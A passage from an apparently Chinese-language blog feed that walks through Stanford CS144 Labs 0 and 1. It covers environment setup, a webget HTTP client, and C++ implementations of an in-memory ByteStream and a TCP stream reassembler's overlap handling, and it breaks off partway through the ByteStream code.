<p>流重组器在 TCP 起到了相当重要的作用。迫于网络环境的限制，TCP 发送者会将数据切割成一个个小段的数据分批发送。但这就可能带来一些新的问题：数据在网络中传输时可能丢失、重排、多次重传等等。而TCP接收者就必须通过流重组器，将接收到的<strong>这些重排重传等等的数据包</strong>重新组装成新的连续字节流。</p>
<h2 id="三、环境配置">三、环境配置</h2>
<p>当前我们的实验代码位于 <code>master</code> 分支，而在完成 Lab1 之前需要合并一些 Lab1 的依赖代码，因此执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git merge origin/lab1-startercode</span><br></pre></td></tr></table></figure>
<p>之后重新 make 编译即可。</p>
<h2 id="四、如何调试">四、如何调试</h2>
<p>先 cmake &amp;&amp; make 一个 Debug 版本的程序。</p>
<p>所有的评测程序位于<code>build/tests/</code>中，先一个个手动执行过去。</p>
<p>若输出了错误信息，则使用 gdb 调试一下。</p>
<h2 id="五、StreamReassembler-实现">五、StreamReassembler 实现</h2>
<h3 id="1-要求">1. 要求</h3>
<p>在我们所实现的流重组器中，有以下几种特性：</p>
<ul>
<li>
<p>接收子字符串。这些子字符串中包含了一串字节，以及该字符串在<strong>总的数据流</strong>中的<strong>第一个字节的索引</strong>。</p>
<blockquote>
<p>是不是有TCP那味了 :-)  感兴趣可以看看真实世界中的 TCP 报文段结构 - <a href="https://kiprey.github.io/2021/05/cnatda-1/#a-TCP%E6%8A%A5%E6%96%87%E6%AE%B5%E7%BB%93%E6%9E%84">Kiprey Blog</a></p>
</blockquote>
</li>
<li>
<p>流的每个字节都有自己唯一的索引，从零开始向上计数。</p>
</li>
<li>
<p>StreamReassembler 中存在一个 ByteStream 用于输出，当重组器知道了流的下一个字节，它就会将其写入至 ByteStream中。</p>
</li>
</ul>
<p>需要注意的是，传入的子串中：</p>
<ul>
<li>
<p>子串之间可能相互重复，存在重叠部分</p>
<blockquote>
<p>但假设重叠部分数据完全重复。</p>
<p>不存在某些 index 下的数据在某个子串中是一种数据，在另一个子串里又是另一种数据。</p>
</blockquote>
<blockquote>
<p>重叠部分的处理最为麻烦。</p>
</blockquote>
</li>
<li>
<p>可能会传一些已经被装配了的数据</p>
</li>
<li>
<p>如果 ByteStream 已满，则必须暂停装配，将未装配数据暂时保存起来</p>
</li>
</ul>
<p>除了上面的要求以外，容量 Capacity 需要严格限制：</p>
<p><img src="/2021/11/cs144-lab1/image-20211107124153476.png" alt="image-20211107124153476"></p>
<p>为了便于说明，将图中的<strong>绿色区域</strong>称为 ByteStream，将图中**存放红色区域的内存范围（即 first unassembled - first unacceptable）**称为 Unassembled_strs。</p>
<p>CS144 要求将 <strong>ByteStream + Unassembled_strs 的内存占用总和</strong>限制在 <strong>Reassember 中构造函数传入的 capacity 大小</strong>。因此我们在构造 Reassembler 时，需要既将传入的 capacity 参数设置为 <code>ByteStream</code>的缓冲区大小上限，也将其设置为<strong>first unassembled - first unacceptable</strong>的范围大小，以避免极端情况下的内存使用。</p>
<blockquote>
<p>注意：<strong>first unassembled - first unacceptable</strong>的范围大小，并不等同于<strong>存放尚未装配子串的结构体内存大小上限</strong>，别混淆了。</p>
</blockquote>
<p>Capacity 这个概念很重要，因为它不仅用于限制高内存占用，而且它还会起到流量控制的作用（见 lab2）。</p>
<h3 id="2-实现思路">2. 实现思路</h3>
<p>总体上，现阶段的要求还是比较简单的，但是，这里面需要考虑到相当多的情况。</p>
<p>在具体说明处理情况之前，我们先简单定义几个变量来指示当前状态：</p>
<ul>
<li><code>_next_assembled_idx</code>：下一个待装配的字节索引</li>
<li><code>_unassemble_strs</code>: 一个字节索引到数据子串的 map 映射</li>
<li><code>_eof_idx</code>: 指示哪个字节索引代表 EOF</li>
</ul>
<p>以下是具体需要考虑的情况</p>
<ol>
<li>
<p><code>index &lt;=  _next_assembled_idx &amp;&amp; index + data.size() &gt; _next_assembled_idx</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index    _next_assembled_idx   index+data.size()   </span><br><span class="line">  V               V                   V </span><br><span class="line">--+-----------------------------------+-----------------------------</span><br><span class="line">  |&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;|&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;|</span><br><span class="line">--+-----------------------------------+-----------------------------</span><br></pre></td></tr></table></figure>
<p>这种情况可以先截断掉</p>
<ul>
<li>前面已经装配过的那部分数据</li>
<li>后面与<strong>已经存入 _unassembled_strs 的数据</strong>重合的那部分数据</li>
</ul>
<p>这样截断是为了让每次装配进的数据与存入 _unassembled_strs 的数据不产生重合，简化处理逻辑。</p>
<p>之后就可以直接装配，无需任何额外处理。</p>
<p>如果装配不下，即 <code>_output</code> 已满，那么就必须先放入待装配队列 <code>_unassembled_strs</code> 中，等待装配。</p>
</li>
<li>
<p><code>index &gt; _next_assembled_idx</code></p>
<p>这种情况是需要认真考虑的，因为这种情况可能会与一些已经保存起来的未装配子串重合，导致大量的内存占用以及无用的轮询处理。对于传入数据的始末位置，分别有好几种情况。</p>
<blockquote>
<p>为了便于说明，我们将<code>_unassembled_strs</code>中比 index <strong>小且距离最近</strong>的那部分数据，称作 up_data, 其起始位置称为 up_idx。<br>
down_data 和 down_idx 同上，指的是在 <code>_unassembled_strs</code>中比当前传入 index 大且距离最近的那部分数据与起始位置。</p>
<p>up 指的是数据前面的那个方向，down 是数据后面的那个方向。</p>
</blockquote>
<p>首先是传入数据头部位置的情况：</p>
<ol>
<li>
<p>若 up_idx + up_data.size() &lt;= index, 则说明当前传入 data 没有与已经保存的上一个子串重叠。这种无需处理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_next_assembled_idx  up_idx                  index  </span><br><span class="line">          V            V    up_data.size      V </span><br><span class="line">----------+------------+------------------+---+-----------------...</span><br><span class="line">          |            |++++++++++++++++++|   |\\\\\\\\\\\\\\\\\...</span><br><span class="line">----------+------------+------------------+---+-----------------...</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>若 up_idx + up_data.size() &gt; index, 则说明传入数据前半部分重合，需要进行截断，同时在截断后更新当前 index。</p>
<p>截断前：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_next_assembled_idx  up_idx       up_idx+up_data.size     </span><br><span class="line">          V            V                  V </span><br><span class="line">----------+------------+-----------+------+-----------------...</span><br><span class="line">          |            |+++++++++++|+&#x2F;+&#x2F;+&#x2F;|\\\\\\\\\\\\\\\\\...</span><br><span class="line">----------+------------+-----------+------+-----------------...</span><br><span class="line">                                   A</span><br><span class="line">                                 index</span><br></pre></td></tr></table></figure>
<p>截断后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_next_assembled_idx  up_idx       up_idx+up_data.size     </span><br><span class="line">          V            V                  V </span><br><span class="line">----------+------------+------------------+-----------------...</span><br><span class="line">          |            |++++++++++++++++++|\\\\\\\\\\\\\\\\\...</span><br><span class="line">----------+------------+------------------+-----------------...</span><br><span class="line">                                          A</span><br><span class="line">                                        new_idx</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>而对于传入数据尾部位置的情况，情况又有所不同：</p>
<ol>
<li>
<p>若 index + data.size() &lt;= down_idx，则说明当前数据的后半部分没有重合，此时无需进行任何处理。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> index      index+data.size  down_idx</span><br><span class="line">   V               V            V</span><br><span class="line">---+---------------+------------+------------------...</span><br><span class="line">   |&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;|            |++++++++++++++++++...</span><br><span class="line">---+---------------+------------+------------------...</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>若 index + data.size() &gt; down_idx，则说明后半部分重合。但后半部分重合又有两种情况</p>
<ol>
<li>
<p><code>index + data.size() &lt; down_idx + down_data.size()</code>，这种就是常规情况的部分重合，截断掉重合部分即可</p>
<p>截断前：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> index              index+data.size   </span><br><span class="line">   V                       V  </span><br><span class="line">---+---------------+-------+------------+-----...</span><br><span class="line">   |&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;|+&#x2F;+&#x2F;+&#x2F;+|++++++++++++|     ...</span><br><span class="line">---+---------------+-------+------------+-----...</span><br><span class="line">                   A                    A</span><br><span class="line">                down_idx       down_idx+down_data.size</span><br></pre></td></tr></table></figure>
<p>截断后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> index       index+data.size   </span><br><span class="line">   V               V  </span><br><span class="line">---+------------------------------------+-----...</span><br><span class="line">   |&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;|++++++++++++++++++++|     ...</span><br><span class="line">---+------------------------------------+-----...</span><br><span class="line">                   A                    A</span><br><span class="line">                down_idx       down_idx+down_data.size</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>index + data.size() &lt; down_idx + down_data.size()，这种是完全重合：当前传入的 data <strong>完全覆盖</strong>下一个保存的data，此时将下一个 data 丢弃。</p>
<p>注意，若存在完全覆盖的情况，则需要<strong>重复</strong>检测 index + data.size 的位置与<strong>丢弃下一个data后，新的下一个data</strong>的<strong>末尾</strong>位置。因为可能当前传入的 data 会<strong>同时覆盖好几个</strong>保存的 data。</p>
<p>处理前：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> index                          index+data.size   </span><br><span class="line">   V                                    V  </span><br><span class="line">---+-----+--------------------+---------+-----+------...</span><br><span class="line">   |&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;|&#x2F;+&#x2F;+&#x2F;+&#x2F;+&#x2F;+&#x2F;+&#x2F;+&#x2F;+&#x2F;+&#x2F;+|&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;|     |++++++...</span><br><span class="line">---+-----+--------------------+---------+-----+------...</span><br><span class="line">         A                    A                 </span><br><span class="line">      down_idx       down_idx+down_data.size</span><br></pre></td></tr></table></figure>
<p>处理后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> index                          index+data.size   </span><br><span class="line">   V                                    V  </span><br><span class="line">---+------------------------------------+-----+------...</span><br><span class="line">   |&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;|     |++++++...</span><br><span class="line">---+------------------------------------+-----+------...</span><br><span class="line">                                              A</span><br><span class="line">                                          新的 down_idx</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
</li>
</ol>
<p>上面所描述的处理方式可以很好的保证，<strong>_unassembled_strs 中的各个子串之间互不重叠，提高了内存利用效率</strong>。这是一种用时间换空间的方式，因为个人认为，从不可靠网络中获取到的数据是相当宝贵的，与降低处理时间相比，会更加宝贵一点。</p>
<p>EOF 的实现需要严格按照实验指导书来。当传入的 eof 参数为真时，表示当前传入的数据子串的<strong>最后一个字节将是整个流中的最后一个字节</strong>，这并不意味着这是最后一次调用 reassembler 来传入子串，因此需要额外将这个 eof_idx 保存，并在 reassemble 后判断一下是否到达 EOF 位置。</p>
<h3 id="3-具体实现">3. 具体实现</h3>
<p>实现的代码已经上传到github上</p>
<ul>
<li><a href="https://github.com/kiprey/sponge/blob/master/libsponge/stream_reassembler.hh" target="_blank" rel="noopener">stream_reassembler.hh</a></li>
<li><a href="https://github.com/kiprey/sponge/blob/master/libsponge/stream_reassembler.cc" target="_blank" rel="noopener">stream_reassembler.cc</a></li>
</ul>
<p>以下是测试结果，总测试时间低于0.5s，还可以。</p>
<p><img src="/2021/11/cs144-lab1/image-20211107094807715.png" alt="image-20211107094807715"></p>
]]></content>
      <tags>
        <tag>计算机网络</tag>
        <tag>CS144</tag>
      </tags>
  </entry>
  <entry>
    <title>CS144计算机网络 Lab0</title>
    <url>/2021/11/cs144-lab0/</url>
    <content><![CDATA[<h2 id="一、简介">一、简介</h2>
<p>这里记录了笔者配置 CS144 计算机网络实验环境的一些步骤。</p>
<p>CS144 Lab0 实验指导书 - <a href="https://cs144.github.io/assignments/lab0.pdf" target="_blank" rel="noopener">Lab Checkpoint 0: networking warmup</a></p>
<p>个人 CS144 实验项目地址 - <a href="https://github.com/Kiprey/sponge" target="_blank" rel="noopener">github</a></p>
<a id="more"></a>
<h2 id="二、环境搭建">二、环境搭建</h2>
<p>如果是使用自己的 Linux 操作系统，照着这个装就好 - <a href="https://stanford.edu/class/cs144/vm_howto/vm-howto-byo.html" target="_blank" rel="noopener">BYO Linux installation</a>。</p>
<p>不过鉴于目前 Linux 下已经装了不少的东西，因此我这边只需额外再装一个 doxygen + clang-format</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install doxygen clang-format</span><br></pre></td></tr></table></figure>
<p>之后下载 CS144 实验包，然后编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --recursive git@github.com:Kiprey/sponge.git</span><br><span class="line">mkdir -p sponge/build</span><br><span class="line"><span class="built_in">cd</span> sponge/build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p>cmake 时可以设置几种编译宏：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-DCMAKE_BUILD_TYPE=Release   <span class="comment"># optimizations</span></span><br><span class="line">-DCMAKE_BUILD_TYPE=Debug     <span class="comment"># debug symbols and -Og</span></span><br><span class="line">-DCMAKE_BUILD_TYPE=RelASan   <span class="comment"># release build with ASan and UBSan</span></span><br><span class="line">-DCMAKE_BUILD_TYPE=RelTSan   <span class="comment"># release build with ThreadSan (私以为这个大概率用不到)</span></span><br><span class="line">-DCMAKE_BUILD_TYPE=DebugASan <span class="comment"># debug build with ASan and UBSan</span></span><br><span class="line">-DCMAKE_BUILD_TYPE=DebugTSan <span class="comment"># debug build with ThreadSan</span></span><br></pre></td></tr></table></figure>
<p>make 也有一些可以用到的编译选项，这里只罗列出比较常用的选项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make doc     <span class="comment"># 在 build/doc 中生成本地静态文档，通过 index.html 访问</span></span><br><span class="line">make format  <span class="comment"># 使用 CLANG 套件 来格式化代码</span></span><br><span class="line">make <span class="built_in">help</span>    <span class="comment"># 查看全部可make的目标</span></span><br><span class="line">make check_* <span class="comment"># 检测编写的代码</span></span><br></pre></td></tr></table></figure>
<h2 id="三、代码风格">三、代码风格</h2>
<p>CS144 使用 C++11 标准完成实验，它对C++代码的风格有着严格的限制：</p>
<ul>
<li>
<p>使用 Resource acquisition is initialization 风格，即 RAII 风格。</p>
</li>
<li>
<p>禁止使用 malloc 和 free 函数</p>
</li>
<li>
<p>禁止使用 new 和 delete 关键字</p>
</li>
<li>
<p>禁止使用原生指针（*）。若有必要，最好使用智能指针（unique_ptr等等）。</p>
<blockquote>
<p>CS144实验指导书说明，该实验没有必要用到指针。</p>
</blockquote>
</li>
<li>
<p>禁止使用模板、线程相关、各类锁机制以及虚函数</p>
</li>
<li>
<p>禁止使用C风格字符串(char*) 以及 C 风格字符串处理函数。使用 string 来代替。</p>
</li>
<li>
<p>禁止使用 C 风格强制类型转换。若有必要请使用 <code>static_cast</code></p>
</li>
<li>
<p>传递参数给函数时，请使用常量引用类型（const Ty&amp; t）</p>
</li>
<li>
<p>尽可能将每个变量和函数方法都声明成 const</p>
</li>
<li>
<p>禁止使用全局变量，以及尽可能让每个变量的作用域最小</p>
</li>
<li>
<p>在完成代码后，务必使用 <code>make format</code> 来标准化代码风格。</p>
</li>
</ul>
<h2 id="四、尝试手动访问网页">四、尝试手动访问网页</h2>
<p>使用 <code>telnet cs144.keithw.org http</code>命令以连接远程网页服务器，之后在终端键入以下内容</p>
<blockquote>
<p>内容中的<code>&lt;enter&gt;</code>指的是按下回车符</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /hello HTTP/1.1&lt;enter&gt;</span><br><span class="line">Host: cs144.keithw.org&lt;enter&gt;</span><br><span class="line">Connection: close&lt;enter&gt;</span><br><span class="line">&lt;enter&gt;</span><br></pre></td></tr></table></figure>
<p>之后就可以看到远程服务器将内容正确返回:</p>
<p><img src="/2021/11/cs144-lab0/image-20211105091331646.png" alt="image-20211105091331646"></p>
<p>比较有意思的是， telnet 在进行 http 访问下，会自动将用户输入的换行转化为 <code>\r\n</code>，而 nc 程序不会这样做。</p>
<h2 id="五、-动手实现一个网络程序">五、 动手实现一个网络程序</h2>
<p>这里我们需要实现一个程序 <code>webget</code>，用于访问外部网页，类似于 wget。</p>
<p>代码量预计 10 行左右，位于<code>apps/webget.cc</code>，实现代码时务必借助 libsponge 中的 <code>TCPSocket</code> 和 <code>Address</code> 类来完成。</p>
<p>需要注意的是</p>
<ul>
<li>
<p>HTTP 头部的每一行末尾都是以<code>\r\n</code>结尾，而不是<code>\n</code></p>
</li>
<li>
<p>需要包含<code>Connection: close</code> 的HTTP头部，以指示远程服务器在处理完当前请求后直接关闭。</p>
</li>
<li>
<p>除非获取到EOF，否则必须<strong>循环</strong>从远程服务器读取信息。</p>
<p>因为网络数据的传输可能断断续续，需要多次 read。</p>
</li>
</ul>
<p>这里贴出我的实现方式：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_URL</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;host, <span class="keyword">const</span> <span class="built_in">string</span> &amp;path)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Your code here.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// You will need to connect to the "http" service on</span></span><br><span class="line">    <span class="comment">// the computer whose name is in the "host" string,</span></span><br><span class="line">    <span class="comment">// then request the URL path given in the "path" string.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Then you'll need to print out everything the server sends back,</span></span><br><span class="line">    <span class="comment">// (not just one call to read() -- everything) until you reach</span></span><br><span class="line">    <span class="comment">// the "eof" (end of file).</span></span><br><span class="line"></span><br><span class="line">    <span class="function">Address <span class="title">addr</span><span class="params">(host, <span class="string">"http"</span>)</span></span>;</span><br><span class="line">    TCPSocket http_tcp;</span><br><span class="line">    http_tcp.connect(addr);</span><br><span class="line">    http_tcp.write(<span class="string">"GET "</span> + path + <span class="string">" HTTP/1.1\r\n"</span>);</span><br><span class="line">    http_tcp.write(<span class="string">"HOST: "</span> + host + <span class="string">"\r\n"</span>);</span><br><span class="line">    http_tcp.write(<span class="string">"Connection: close\r\n"</span>);</span><br><span class="line">    http_tcp.write(<span class="string">"\r\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(!http_tcp.eof())</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; http_tcp.read();</span><br><span class="line">    http_tcp.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行的很成功：</p>
<p><img src="/2021/11/cs144-lab0/image-20211105103200309.png" alt="image-20211105103200309"></p>
<h2 id="六、实现Lab0">六、实现Lab0</h2>
<p>Lab0 要求我们实现一个<strong>在内存中的</strong> 有序可靠字节流（有点类似于管道）</p>
<p>要求</p>
<ul>
<li>
<p>字节流可以从<strong>写入端</strong>写入，并以<strong>相同的顺序</strong>，从<strong>读取端</strong>读取</p>
</li>
<li>
<p>字节流是有限的，写者可以终止写入。而读者可以在读取到字节流末尾时，产生EOF标志，不再读取。</p>
</li>
<li>
<p>所实现的字节流必须支持<strong>流量控制</strong>，以控制内存的使用。当所使用的缓冲区爆满时，将禁止写入操作。直到读者读取了一部分数据后，空出了一部分缓冲区内存，才让写者写入。</p>
</li>
<li>
<p>写入的字节流可能会很长，必须考虑到字节流大于缓冲区大小的情况。即便缓冲区只有1字节大小，所实现的程序也必须支持正常的写入读取操作。</p>
</li>
</ul>
<blockquote>
<p>在单线程环境下执行，因此不用考虑各类条件竞争问题。</p>
</blockquote>
<p>这是在<strong>内存</strong>中的有序可靠字节流，接下来的实验会让我们在<strong>不可靠网络</strong>中实现一个这样的可靠字节流，而这便是<strong>传输控制协议（Transmission Control Protocol，TCP）</strong></p>
<p>以下是实现的代码。</p>
<p>首先是类声明的实现，这里我添加了一个私有变量用以存放一些数据：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ByteStream</span> &#123;</span></span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// Your code here -- add private members as necessary.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Hint: This doesn't need to be a sophisticated data structure at</span></span><br><span class="line">    <span class="comment">// all, but if any of your tests are taking longer than a second,</span></span><br><span class="line">    <span class="comment">// that's a sign that you probably want to keep exploring</span></span><br><span class="line">    <span class="comment">// different approaches.</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">deque</span>&lt;<span class="keyword">char</span>&gt; _queue;</span><br><span class="line">    <span class="keyword">size_t</span> _capacity_size;</span><br><span class="line">    <span class="keyword">size_t</span> _written_size;</span><br><span class="line">    <span class="keyword">size_t</span> _read_size;</span><br><span class="line">    <span class="keyword">bool</span> _end_input;</span><br><span class="line">    <span class="keyword">bool</span> _error&#123;&#125;;  <span class="comment">//!&lt; Flag indicating that the stream suffered an error.</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//! Construct a stream with room for `capacity` bytes.</span></span><br><span class="line">    ByteStream(<span class="keyword">const</span> <span class="keyword">size_t</span> capacity);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! \name "Input" interface for the writer</span></span><br><span class="line">    <span class="comment">//!@&#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//! Write a string of bytes into the stream. Write as many</span></span><br><span class="line">    <span class="comment">//! as will fit, and return how many were written.</span></span><br><span class="line">    <span class="comment">//! \returns the number of bytes accepted into the stream</span></span><br><span class="line">    <span class="function"><span class="keyword">size_t</span> <span class="title">write</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;data)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! \returns the number of additional bytes that the stream has space for</span></span><br><span class="line">    <span class="function"><span class="keyword">size_t</span> <span class="title">remaining_capacity</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! Signal that the byte stream has reached its ending</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">end_input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! Indicate that the stream suffered an error.</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">set_error</span><span class="params">()</span> </span>&#123; _error = <span class="literal">true</span>; &#125;</span><br><span class="line">    <span class="comment">//!@&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//! \name "Output" interface for the reader</span></span><br><span class="line">    <span class="comment">//!@&#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//! Peek at next "len" bytes of the stream</span></span><br><span class="line">    <span class="comment">//! \returns a string</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">peek_output</span><span class="params">(<span class="keyword">const</span> <span class="keyword">size_t</span> len)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! Remove bytes from the buffer</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pop_output</span><span class="params">(<span class="keyword">const</span> <span class="keyword">size_t</span> len)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! Read (i.e., copy and then pop) the next "len" bytes of the stream</span></span><br><span class="line">    <span class="comment">//! \returns a string</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">read</span><span class="params">(<span class="keyword">const</span> <span class="keyword">size_t</span> len)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! \returns `true` if the stream input has ended</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">input_ended</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! \returns `true` if the stream has suffered an error</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">error</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> _error; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! \returns the maximum amount that can currently be read from the stream</span></span><br><span class="line">    <span class="function"><span class="keyword">size_t</span> <span class="title">buffer_size</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! \returns `true` if the buffer is empty</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">buffer_empty</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! \returns `true` if the output has reached the ending</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">eof</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="comment">//!@&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//! \name General accounting</span></span><br><span class="line">    <span class="comment">//!@&#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//! Total number of bytes written</span></span><br><span class="line">    <span class="function"><span class="keyword">size_t</span> <span class="title">bytes_written</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//! Total number of bytes popped</span></span><br><span class="line">    <span class="function"><span class="keyword">size_t</span> <span class="title">bytes_read</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="comment">//!@&#125;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>具体的成员实现：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">ByteStream::ByteStream(<span class="keyword">const</span> <span class="keyword">size_t</span> capacity)</span><br><span class="line">    : _queue(), _capacity_size(capacity), _written_size(<span class="number">0</span>), _read_size(<span class="number">0</span>), _end_input(<span class="literal">false</span>), _error(<span class="literal">false</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">ByteStream::write</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (_end_input)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> write_size = min(data.size(), _capacity_size - _queue.size());</span><br><span class="line">    _written_size += write_size;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; write_size; i++)</span><br><span class="line">        _queue.push_back(data[i]);</span><br><span class="line">    <span class="keyword">return</span> write_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//! \param[in] len bytes will be copied from the output side of the buffer</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">ByteStream::peek_output</span><span class="params">(<span class="keyword">const</span> <span class="keyword">size_t</span> len)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> pop_size = min(len, _queue.size());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">string</span>(_queue.begin(), _queue.begin() + pop_size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//! \param[in] len bytes will be removed from the output side of the buffer</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ByteStream::pop_output</span><span class="params">(<span class="keyword">const</span> <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> pop_size = min(len, _queue.size());</span><br><span class="line">    _read_size += len;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; pop_size; i++)</span><br><span class="line">        _queue.pop_front();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//! Read (i.e., copy and then pop) the next "len" bytes of the stream</span></span><br><span class="line"><span class="comment">//! \param[in] len bytes will be popped and returned</span></span><br><span class="line"><span class="comment">//! \returns a string</span></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">ByteStream::read</span><span class="params">(<span class="keyword">const</span> <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> data = <span class="keyword">this</span>-&gt;peek_output(len);</span><br><span class="line">    <span class="keyword">this</span>-&gt;pop_output(len);</span><br><span class="line">    <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ByteStream::end_input</span><span class="params">()</span> </span>&#123; _end_input = <span 